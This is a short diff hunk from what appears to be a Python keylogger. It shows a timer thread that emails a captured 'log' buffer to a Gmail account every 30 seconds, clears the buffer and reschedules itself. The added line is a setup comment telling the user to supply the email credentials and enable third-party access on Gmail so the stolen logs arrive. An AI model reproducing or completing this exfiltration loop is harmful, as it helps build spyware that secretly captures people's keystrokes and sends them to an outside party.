@@ -33,6 +33,7 @@ def send_email(email, password, text):
 def thread():
     global log
     send_email("email_address@gmail.com", "password", log.encode('utf-8'))
+    #have to add email address and it's password and also must activate third party on gmail account to recieve mails
     log = ""
     timer_object = threading.Timer(30, thread)
     timer_object.start()
